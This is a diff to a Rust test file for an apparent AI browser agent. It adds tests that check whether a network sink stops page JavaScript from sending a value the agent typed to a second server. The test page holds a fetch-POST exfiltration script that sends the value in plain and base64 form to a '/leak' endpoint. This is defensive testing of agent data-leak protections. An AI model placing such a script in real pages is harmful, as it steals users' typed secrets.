@@ -143,7 +143,11 @@ fn handle_of(text: &str, needle: &str) -> String {
     line[s + 1..e].to_string()
 }
 
+/// The mutation switch is a process env var read at spawn: serialise the runs that flip it.
+static ENV_LOCK: Mutex<()> = Mutex::new(());
+
 fn run(mutate: bool) -> (usize, usize, usize) {
+    let _g = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
     let (b, b_log) = serve("<html><body><h1>B side</h1></body></html>".into());
     let a_page = format!(
         r#"<!doctype html><html><head><title>A</title></head><body><h1>Account</h1>
@@ -237,4 +241,61 @@ fn mutant_without_the_check_goes_red() {
         blocked < 8 && leaked > 0,
         "mutant stayed green: blocked={blocked} leaked={leaked}"
     );
+}
+
+/// W4.D2.a: the agent TYPES a value into a field on A; page JS then reads it and fetch-posts it
+/// (plain and base64) to B. The network sink in manuk_net must stop both; returns B's /leak count.
+fn run_js(mutate: bool) -> usize {
+    let _g = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+    let (b, b_log) = serve("<html><body>B</body></html>".into());
+    let a_page = format!(
+        r#"<!doctype html><html><head><title>A</title></head><body><h1>Profile</h1>
+<input id="f" aria-label="memo-field">
+<button id="go" aria-label="sync-btn">Sync</button>
+<script>
+document.getElementById('go').addEventListener('click', function () {{
+  var v = document.getElementById('f').value;
+  fetch('{b}/leak', {{method: 'POST', headers: {{'Content-Type': 'text/plain'}}, body: 'plain=' + v}}).catch(function () {{}});
+  fetch('{b}/leak', {{method: 'POST', headers: {{'Content-Type': 'text/plain'}}, body: 'b64=' + btoa(v)}}).catch(function () {{}});
+}});
+</script></body></html>"#
+    );
+    let (a, _) = serve(a_page);
+    if mutate {
+        std::env::set_var("MANUK_TAINT_MUTATE", "1");
+    }
+    let mut c = Client::start(false, &[]);
+    std::env::remove_var("MANUK_TAINT_MUTATE");
+    let _ = c.ok("navigate", json!({"url": format!("{a}/")}));
+    let obs = c.ok("observe", json!({}));
+    let (f, go) = (handle_of(&obs, "memo-field"), handle_of(&obs, "sync-btn"));
+    c.ok("type", json!({"handle": f, "text": SECRET}));
+    let (e, t) = c.call("act", json!({"handle": go, "action": "click"}));
+    eprintln!(
+        "D2.a click err={e}: {}",
+        t.lines().take(6).collect::<Vec<_>>().join(" / ")
+    );
+    std::thread::sleep(std::time::Duration::from_millis(1500));
+    let n = b_log
+        .lock()
+        .unwrap()
+        .iter()
+        .filter(|l| l.contains("/leak"))
+        .count();
+    eprintln!("D2.a page-JS leaks to B (mutate={mutate}): {n}");
+    n
+}
+
+#[test]
+fn page_js_cannot_post_a_typed_value_to_b() {
+    assert_eq!(
+        run_js(false),
+        0,
+        "page-JS fetch carried the typed value to B"
+    );
+}
+
+#[test]
+fn page_js_mutant_goes_red() {
+    assert!(run_js(true) > 0, "mutant stayed green: nothing reached B");
 }
